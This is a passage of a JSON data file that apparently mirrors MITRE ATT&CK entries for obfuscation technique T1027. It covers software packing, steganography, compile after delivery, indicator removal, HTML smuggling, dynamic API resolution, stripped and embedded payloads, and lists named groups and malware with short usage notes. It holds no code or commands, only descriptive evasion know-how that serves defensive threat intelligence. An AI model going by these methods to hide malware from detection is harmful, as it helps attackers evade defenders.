                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection.[11][12]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> uses packers such as Themida to obfuscate malicious files.[13]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> uses a software packer called Pe123\\RPolyCryptor.[14]"
                    },
                    "S0638": {
                        "ID": "S0638",
                        "Name": "Babuk",
                        "Description": "Versions of <name> have been packed.[15][16][17]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> has a variant with a packed payload.[18][19]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has used the MPRESS packer and similar tools for obfuscation.[20]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has been packed with the UPX packer.[21]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 used VMProtect to slow the reverse engineering of malicious binaries.[22]"
                    },
                    "S0020": {
                        "ID": "S0020",
                        "Name": "China Chopper",
                        "Description": "<name>'s client component is packed with UPX.[23]"
                    },
                    "S0611": {
                        "ID": "S0611",
                        "Name": "Clop",
                        "Description": "<name> has been packed to help avoid detection.[24][25]"
                    },
                    "S1105": {
                        "ID": "S1105",
                        "Name": "COATHANGER",
                        "Description": "The first stage of <name> is delivered as a packed file.[26]"
                    },
                    "S0614": {
                        "ID": "S0614",
                        "Name": "CostaBricks",
                        "Description": "<name> can implement a custom-built virtual machine mechanism to obfuscate its code.[27]"
                    },
                    "S0527": {
                        "ID": "S0527",
                        "Name": "CSPY Downloader",
                        "Description": "<name> has been packed with UPX.[28]"
                    },
                    "S0625": {
                        "ID": "S0625",
                        "Name": "Cuba",
                        "Description": "<name> has a packed payload when delivered.[29]"
                    },
                    "G0070": {
                        "ID": "G0070",
                        "Name": "Dark Caracal",
                        "Description": "<name> has used UPX to pack Bandook.[30]"
                    },
                    "S0334": {
                        "ID": "S0334",
                        "Name": "DarkComet",
                        "Description": "<name> has the option to compress its payload using UPX or MPRESS.[31]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "A version of <name> uses the MPRESS packer.[32]"
                    },
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> is packed with an UPX executable packer.[33]"
                    },
                    "S0695": {
                        "ID": "S0695",
                        "Name": "Donut",
                        "Description": "<name> can generate packed code modules.[34]"
                    },
                    "S0694": {
                        "ID": "S0694",
                        "Name": "DRATzarus",
                        "Description": "<name>'s dropper can be packed with UPX.[35]"
                    },
                    "S0024": {
                        "ID": "S0024",
                        "Name": "Dyre",
                        "Description": "<name> has been delivered with encrypted resources and must be unpacked for execution.[36]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name>'s payloads are custom-packed, archived and encrypted to prevent analysis.[37][38]"
                    },
                    "G0066": {
                        "ID": "G0066",
                        "Name": "Elderwood",
                        "Description": "<name> has packed malware payloads before delivery to victims.[39]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has packed malware to help avoid detection.[40]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has used custom packers to protect its payloads.[41]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> has been regularly repacked by its operators to create large binaries and evade detection.[42]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "A <name> variant uses a custom packer.[43][44]"
                    },
                    "S0628": {
                        "ID": "S0628",
                        "Name": "FYAnti",
                        "Description": "<name> has used ConfuserEx to pack its .NET module.[45]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> packed some payloads using different types of packers, both known and custom.[46]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> has been packed for obfuscation.[47]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> is packed for obfuscation.[48]"
                    },
                    "S0132": {
                        "ID": "S0132",
                        "Name": "H1N1",
                        "Description": "<name> uses a custom packing algorithm.[49]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has packed ELF files into other binaries.[50]"
                    },
                    "S0431": {
                        "ID": "S0431",
                        "Name": "HotCroissant",
                        "Description": "<name> has used the open source UPX executable packer.[51]"
                    },
                    "S0398": {
                        "ID": "S0398",
                        "Name": "HyperBro",
                        "Description": "<name> has the ability to pack its payload.[52]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has packed and encrypted its loader module.[53]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> payloads have been packed.[54]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has packed malware with UPX.[6]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has been packed for obfuscation.[55]"
                    },
                    "S0513": {
                        "ID": "S0513",
                        "Name": "LiteDuke",
                        "Description": "<name> has been packed with multiple layers of encryption.[42]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has used several packing methods for obfuscation.[56]"
                    },
                    "S0532": {
                        "ID": "S0532",
                        "Name": "Lucifer",
                        "Description": "<name> has used UPX packed binaries.[57]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> has been packed with NSIS.[58]"
                    },
                    "S0530": {
                        "ID": "S0530",
                        "Name": "Melcoz",
                        "Description": "<name> has been packed with VMProtect and Themida.[59]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has used VMProtect to pack and protect files.[60]"
                    },
                    "S0083": {
                        "ID": "S0083",
                        "Name": "Misdat",
                        "Description": "<name> was typically packed using UPX.[61]"
                    },
                    "S1026": {
                        "ID": "S1026",
                        "Name": "Mongall",
                        "Description": "<name> has been packed with Themida.[5]"
                    },
                    "G1019": {
                        "ID": "G1019",
                        "Name": "MoustachedBouncer",
                        "Description": "<name> has used malware plugins packed with Themida.[62]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has used .NET packer tools to evade detection.[63]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors used software packing in its tools.[64]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.[65]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group packed malicious .db files with Themida to evade detection.[35][66][67]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "For <name>, the threat actors used UPX to pack some payloads.[61]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "For <name>, the threat actors used a variety of packers, including CyaX, to obfuscate malicious executables.[68]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> has a variant that is packed with UPX.[69]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "A <name> payload was packed with UPX.[70]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can encrypt and pack malicious payloads.[71]"
                    },
                    "S0565": {
                        "ID": "S0565",
                        "Name": "Raindrop",
                        "Description": "<name> used a custom packer for its Cobalt Strike payload, which was compressed using the LZMA algorithm.[72][73]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name>'s miner has created UPX-packed files in the Windows Start Menu Folder.[74][75][76]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "Some <name> samples have been packed with UPX.[61]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has been packed using a dark market crypter.[77]"
                    },
                    "S0461": {
                        "ID": "S0461",
                        "Name": "SDBbot",
                        "Description": "<name> has used a packed installer file.[78]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> has been packed with the UPX packer.[79]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name>'s loader has been packed with the compressed <name> core DLL and the legitimate DLL for it to hijack.[80]"
                    },
                    "S0543": {
                        "ID": "S0543",
                        "Name": "Spark",
                        "Description": "<name> has been packed with Enigma Protector to obfuscate its contents.[81]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has been packed with a custom packer to hide payloads.[82][83]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> has been packed with VMProtect.[52][84]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used a .NET packer to obfuscate malicious files.[85]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used UPX to obscure malicious code.[78]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has used UPX and Ezuri packer to pack its binaries.[86]"
                    },
                    "G0089": {
                        "ID": "G0089",
                        "Name": "The White Company",
                        "Description": "<name> has obfuscated their payloads through packing.[87]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has packed malware and tools, including using VMProtect.[88][52]"
                    },
                    "S0671": {
                        "ID": "S0671",
                        "Name": "Tomiris",
                        "Description": "<name> has been packed with UPX.[89]"
                    },
                    "S0678": {
                        "ID": "S0678",
                        "Name": "Torisma",
                        "Description": "<name> has been packed with Iz4 compression.[67]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> leverages a custom packer to obfuscate its functionality.[90]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.[91][92]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> uses a custom packer.[93][94]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has used packed DLL payloads.[95]"
                    },
                    "S0257": {
                        "ID": "S0257",
                        "Name": "VERMIN",
                        "Description": "<name> is initially packed.[96]"
                    },
                    "S0248": {
                        "ID": "S0248",
                        "Name": "yty",
                        "Description": "<name> packs a plugin with UPX.[97]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name>'s Delphi variant was packed with UPX.[98][99]"
                    },
                    "S0230": {
                        "ID": "S0230",
                        "Name": "ZeroT",
                        "Description": "Some <name> DLL files have been packed with UPX.[100]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used multi-stage packers for exploit code.[101]"
                    }
                }
            },
            "003": {
                "name": "Steganography",
                "href": "/techniques/T1027/003",
                "description": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.Duqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.[1] By the end of 2017, a threat group used\u202fInvoke-PSImage\u202fto hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.[2]",
                "Procedure": {
                    "S0469": {
                        "ID": "S0469",
                        "Name": "ABK",
                        "Description": "<name> can extract a malicious Portable Executable (PE) from a photo.[3]"
                    },
                    "G0138": {
                        "ID": "G0138",
                        "Name": "Andariel",
                        "Description": "<name> has hidden malicious executables within PNG files.[4][5]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> uses steganography to send images to users that are embedded with shellcode.[6][7]"
                    },
                    "S0473": {
                        "ID": "S0473",
                        "Name": "Avenger",
                        "Description": "<name> can extract backdoor malware from downloaded images.[3]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> has used .PNG images within a zip file to build the executable. [8]"
                    },
                    "S0470": {
                        "ID": "S0470",
                        "Name": "BBK",
                        "Description": "<name> can extract a malicious Portable Executable (PE) from a photo.[3]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used steganography in multiple operations to conceal malicious payloads.[3]"
                    },
                    "S0471": {
                        "ID": "S0471",
                        "Name": "build_downer",
                        "Description": "<name> can extract malware from a downloaded JPEG.[3]"
                    },
                    "S0659": {
                        "ID": "S0659",
                        "Name": "Diavol",
                        "Description": "<name> has obfuscated its main code routines within bitmap images as part of its anti-analysis techniques.[9]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has used steganography to hide shellcode in a BMP image file.[10]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has embedded binaries within RC4 encrypted .png files.[11]"
                    },
                    "S0231": {
                        "ID": "S0231",
                        "Name": "Invoke-PSImage",
                        "Description": "<name> can be used to embed a PowerShell script within the pixels of a PNG file.[12]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used steganography to hide stolen data inside other files stored on Github.[13]"
                    },
                    "S0513": {
                        "ID": "S0513",
                        "Name": "LiteDuke",
                        "Description": "<name> has used image files to hide its loader component.[14]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has stored obfuscated JavaScript code in an image file named temp.jpg.[15]"
                    },
                    "S0644": {
                        "ID": "S0644",
                        "Name": "ObliqueRAT",
                        "Description": "<name> can hide its payload in BMP images hosted on compromised websites.[16]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name>'s payload is encrypted and embedded within its loader, or within a legitimate PNG file.[17]"
                    },
                    "C0023": {
                        "ID": "C0023",
                        "Name": "Operation Ghost",
                        "Description": "During <name>, APT29 used steganography to hide payloads inside valid images.[14]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "For <name>, the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data.[18]"
                    },
                    "S0518": {
                        "ID": "S0518",
                        "Name": "PolyglotDuke",
                        "Description": "<name> can use steganography to hide C2 information in images.[14]"
                    },
                    "S0139": {
                        "ID": "S0139",
                        "Name": "PowerDuke",
                        "Description": "<name> uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).[19]"
                    },
                    "S0654": {
                        "ID": "S0654",
                        "Name": "ProLock",
                        "Description": "<name> can use .jpg and .bmp files to store its payload.[20]"
                    },
                    "S0565": {
                        "ID": "S0565",
                        "Name": "Raindrop",
                        "Description": "<name> used steganography to locate the start of its encoded payload within legitimate 7-Zip code.[21]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> has PE data embedded within JPEG files contained within Word documents.[22]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> can also embed data within a BMP image prior to exfiltration.[23]"
                    },
                    "S0511": {
                        "ID": "S0511",
                        "Name": "RegDuke",
                        "Description": "<name> can hide data in images, including use of the Least Significant Bit (LSB).[14]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has hidden encoded data for malware DLLs in a PNG.[24]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has used JPG files with encrypted payloads to mask their backdoor routines and evade detection.[25]"
                    }
                }
            },
            "004": {
                "name": "Compile After Delivery",
                "href": "/techniques/T1027/004",
                "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.[1]Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.[2]",
                "Procedure": {
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> and its watchdog component are compiled and executed after being delivered to victims as embedded, uncompiled source code.[3]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> has used the csc.exe tool to compile a C# executable.[4]"
                    },
                    "S0661": {
                        "ID": "S0661",
                        "Name": "FoggyWeb",
                        "Description": "<name> can compile and execute source code sent to the compromised AD FS server via a specific HTTP POST.[5]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class.[6]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used the .NET csc.exe tool to compile executables from downloaded C# code.[1]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> has used AutoIt to compile the payload and main script into a single executable after delivery.[7]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC).[8]"
                    },
                    "S1099": {
                        "ID": "S1099",
                        "Name": "Samurai",
                        "Description": "<name> can compile and execute downloaded modules at runtime.[9]"
                    }
                }
            },
            "005": {
                "name": "Indicator Removal from Tools",
                "href": "/techniques/T1027/005",
                "description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
                "Procedure": {
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has been known to remove indicators of compromise from tools.[1]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> includes a capability to modify the Beacon payload to eliminate known signatures or unpacking methods.[2][3]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "Analysis of <name> has shown that it regularly undergoes technical improvements to evade anti-virus detection.[4]"
                    },
                    "G0009": {
                        "ID": "G0009",
                        "Name": "Deep Panda",
                        "Description": "<name> has updated and modified its malware, resulting in different hash values that evade detection.[5]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> ensured each payload had a unique hash, including by using different types of packers.[6]"
                    },
                    "S0237": {
                        "ID": "S0237",
                        "Name": "GravityRAT",
                        "Description": "The author of <name> submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.[7]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has undergone regular technical improvements in an attempt to evade detection.[8]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.[9][10]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors edited variable names within the Impacket suite to avoid automated detection.[11]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.[12]"
                    },
                    "S0587": {
                        "ID": "S0587",
                        "Name": "Penquin",
                        "Description": "<name> can remove strings from binaries.[13]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name>'s Find-AVSignature AntivirusBypass module can be used to locate single byte anti-virus signatures.[14][15]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can make small changes to itself in order to change its checksum and hash value.[16][17]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> source code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added to SUNSPOT.[18]"
                    },
                    "C0030": {
                        "ID": "C0030",
                        "Name": "Triton Safety Instrumented System Attack",
                        "Description": "In the <name>, TEMP.Veles modified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates.[19]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "Based on comparison of Gazer versions, <name> made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.[20]"
                    },
                    "S0579": {
                        "ID": "S0579",
                        "Name": "Waterbear",
                        "Description": "<name> can scramble functions not to be executed again with random values.[21]"
                    }
                }
            },
            "006": {
                "name": "HTML Smuggling",
                "href": "/techniques/T1027/006",
                "description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.[1][2]Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as text/plain and/or text/html. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters.For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as msSaveBlob.[1][3][2][4]",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has embedded an ISO file within an HTML attachment that contained JavaScript code to initiate malware execution.[5]"
                    },
                    "S0634": {
                        "ID": "S0634",
                        "Name": "EnvyScout",
                        "Description": "<name> contains JavaScript code that can extract an encoded blob from its HTML body and write it to disk.[6]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has been delivered in ZIP files via HTML smuggling.[7][8]"
                    }
                }
            },
            "007": {
                "name": "Dynamic API Resolution",
                "href": "/techniques/T1027/007",
                "description": "Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.[1][2]To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to Software Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as GetProcAddress() and LoadLibrary(). These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of Deobfuscate/Decode Files or Information during execution).[3][4][1]",
                "Procedure": {
                    "S1053": {
                        "ID": "S1053",
                        "Name": "AvosLocker",
                        "Description": "<name> has used obfuscated API calls that are retrieved by their checksums.[5]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can hash then resolve API calls at runtime.[6][7]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can call and dynamically resolve hashed APIs.[8]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used a custom hashing method to resolve APIs used in shellcode.[9]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> can use a dynamic Windows hashing algorithm to map API components.[10]"
                    },
                    "S1099": {
                        "ID": "S1099",
                        "Name": "Samurai",
                        "Description": "<name> can encrypt API name strings with an XOR-based algorithm.[11]"
                    }
                }
            },
            "008": {
                "name": "Stripped Payloads",
                "href": "/techniques/T1027/008",
                "description": "Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system\u2019s linker when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.[1][2]Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of AppleScript, to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.[3]",
                "Procedure": {
                    "S1048": {
                        "ID": "S1048",
                        "Name": "macOS.OSAMiner",
                        "Description": "<name> has used run-only Applescripts, a compiled and stripped version of AppleScript, to remove human readable indicators to evade detection.[3]"
                    }
                }
            },
            "009": {
                "name": "Embedded Payloads",
                "href": "/techniques/T1027/009",
                "description": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets.[1] Adversaries may embed payloads in various file formats to hide payloads.[2] This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.[3] For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.[4] Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.[5] Embedded content may also be used as Process Injection payloads used to infect benign system processes.[6] These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.[7]",
                "Procedure": {
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> has an embedded second stage DLL payload within the first stage of the malware.[8]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "For <name>, the threat actors embedded a base64-encoded payload within a LNK file.[9]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has embedded a XOR encrypted communications module inside the orchestrator module.[10][11]"
                    },
                    "S1052": {
                        "ID": "S1052",
                        "Name": "DEADEYE",
                        "Description": "The <name>.EMBED variant of <name> has the ability to embed payloads inside of a compiled binary.[12]"
                    },
                    "S0567": {
                        "ID": "S0567",
                        "Name": "Dtrack",
                        "Description": "<name> has used a dropper that embeds an encrypted payload as extra data.[13]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has dropped an embedded executable at %Temp%\\setup.exe.[14]"
                    },
                    "S0231": {
                        "ID": "S0231",
                        "Name": "Invoke-PSImage",
                        "Description": "<name> can be used to embed payload data within a new image file.[3]"
                    },
                    "S1048": {
                        "ID": "S1048",
                        "Name": "macOS.OSAMiner",
                        "Description": "<name> has embedded Stripped Payloads within another run-only Stripped Payloads.[5]"
                    },
                    "S0457": {
                        "ID": "S0457",
                        "Name": "Netwalker",
                        "Description": "<name>'s DLL has been embedded within the PowerShell script in hex format.[15]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "The <name> source code is embedded in the dropper as an encrypted string.[16]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "The <name> Queue file contains embedded executable files along with key material, communication channels, and modes of operation.[17]"
                    }
                }
            },
            "010": {
                "name": "Command Obfuscation",
                "href": "/techniques/T1027/010",
